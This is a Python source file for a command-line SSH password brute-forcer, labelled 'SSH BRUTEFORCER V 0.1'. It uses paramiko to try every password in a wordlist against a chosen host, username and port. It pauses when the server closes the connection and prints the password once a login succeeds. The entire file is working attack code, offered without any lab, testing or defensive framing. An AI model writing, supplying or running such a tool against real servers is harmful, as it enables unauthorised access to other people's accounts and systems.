#!/bin/python3
import time
import os
import paramiko
import sys
import argparse
def banner():
 banner="""
                  ▄▄  ▄▄▄▄▄▄▄▄                                ▄▄        ▄▄
       ██        ██   ▀▀▀▀▀███                        ██       █▄        █▄
      ██        ██        ██▀    ▄████▄    ██▄████  ███████     █▄        █▄
     ██        ██       ▄██▀    ██▄▄▄▄██   ██▀        ██         █▄        █▄
    ▄█▀       ▄█▀      ▄██      ██▀▀▀▀▀▀   ██         ██          █▄        █
   ▄█▀       ▄█▀      ███▄▄▄▄▄  ▀██▄▄▄▄█   ██         ██▄▄▄        █▄        █▄
  ▄█▀       ▄█▀       ▀▀▀▀▀▀▀▀    ▀▀▀▀▀    ▀▀          ▀▀▀▀         █▄        █▄
 """
 return banner
def parse():
 global host,user,port,path_to_file
 print(banner())
 parser = argparse.ArgumentParser(description="SSH BRUTEFORCER V 0.1")
 parser.add_argument("host", help="IP Address of server")
 parser.add_argument("--wordlist", help="File with passwords")
 parser.add_argument("-U", "--user", help="Username")
 parser.add_argument("-P","--port",help="Port to ssh")
 args = parser.parse_args()
 host = args.host
 path_to_file= args.wordlist
 user = args.user
 port=args.port
def main():
 global passwords
 parse()
 passwords=get_password()
 connection()
 bruteforce(passwords)
def get_password():
 passwords=[]
 with open (path_to_file,'r') as file:
  passwords=[row.strip() for row in file]
 return passwords
def connection():
  global client
  client = paramiko.SSHClient()
  client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
def bruteforce(passwords):
 print("Starting...")
 for password in passwords:
  try:
   client.connect(hostname=host, username=user, password=password, port=port)
  except paramiko.ssh_exception.AuthenticationException:
   print("Wrong:{}".format(password))
   continue
  except paramiko.SSHException:
   print("Server closed connection(Waiting 20 seconds)")
   time.sleep(20)
   continue
  else:
   print("PASSWORD WAS FOUND!:{}".format(password))
   client.close()
   sys.exit()
main()
